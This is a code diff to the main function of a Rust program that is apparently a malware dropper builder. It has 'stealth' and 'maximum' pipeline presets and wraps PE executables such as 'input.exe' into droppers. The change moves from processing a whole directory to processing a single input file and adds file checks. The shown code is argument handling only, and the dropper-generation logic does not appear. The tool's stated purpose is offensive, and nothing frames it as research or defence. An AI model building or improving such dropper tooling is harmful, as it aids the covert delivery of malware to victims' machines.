@@ -200,59 +200,50 @@ fn main() {
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     let args: Vec<String> = std::env::args().collect();
 
-    if args.len() < 2 {
-        eprintln!("Usage: {} <pipeline_preset> [input_directory] [output_directory]", args[0]);
+    if args.len() < 3 {
+        eprintln!("Usage: {} <pipeline_preset> <input_file> [output_directory]", args[0]);
         eprintln!("Pipeline presets: minimal, stealth, maximum");
-        eprintln!("Example: {} stealth samples out", args[0]);
+        eprintln!("Example: {} stealth input.exe out", args[0]);
         std::process::exit(1);
     }
 
     let pipeline_preset = &args[1];
-    let input_dir = if args.len() > 2 { &args[2] } else { "samples" };
+    let input_file = &args[2];
     let output_dir = if args.len() > 3 { &args[3] } else { "out" };
 
-    let input_path = Path::new(input_dir);
+    let input_path = Path::new(input_file);
     let output_path = Path::new(output_dir);
 
     if !input_path.exists() {
-        eprintln!("Error: Input directory not found at {}", input_path.display());
+        eprintln!("Error: Input file not found at {}", input_path.display());
+        std::process::exit(1);
+    }
+
+    if !input_path.is_file() {
+        eprintln!("Error: Input path is not a file: {}", input_path.display());
         std::process::exit(1);
     }
 
     fs::create_dir_all(output_path)?;
 
-    println!("Building droppers with {} pipeline", pipeline_preset);
-    println!("Input directory: {}", input_path.display());
+    println!("Building dropper with {} pipeline", pipeline_preset);
+    println!("Input file: {}", input_path.display());
     println!("Output directory: {}", output_path.display());
 
-    // Process all PE files in the input directory
-    let mut processed_count = 0;
-    let mut error_count = 0;
+    // Process the single input file
+    let file_name = input_path.file_name().unwrap().to_string_lossy();
+    let output_file = output_path.join(file_name.as_ref());
 
-    for entry in fs::read_dir(input_path)? {
-        let entry = entry?;
-        let file_path = entry.path();
-
-        if file_path.is_file() {
-            let file_name = file_path.file_name().unwrap().to_string_lossy();
-            let output_file = output_path.join(file_name.as_ref());
-
-            match create_dropper_executable(&file_path, &output_file, pipeline_preset) {
-                Ok(_) => {
-                    println!("✓ Created dropper: {}", output_file.display());
-                    processed_count += 1;
-                },
-                Err(e) => {
-                    println!("✗ Failed to create dropper for {}: {}", file_name, e);
-                    error_count += 1;
-                }
-            }
+    match create_dropper_executable(input_path, &output_file, pipeline_preset) {
+        Ok(_) => {
+            println!("✓ Created dropper: {}", output_file.display());
+            println!("Pipeline complete!");
+        },
+        Err(e) => {
+            println!("✗ Failed to create dropper for {}: {}", file_name, e);
+            std::process::exit(1);
         }
     }
-
-    println!("\nPipeline complete!");
-    println!("Successfully processed: {} files", processed_count);
-    println!("Errors: {} files", error_count);
 
     Ok(())
 }
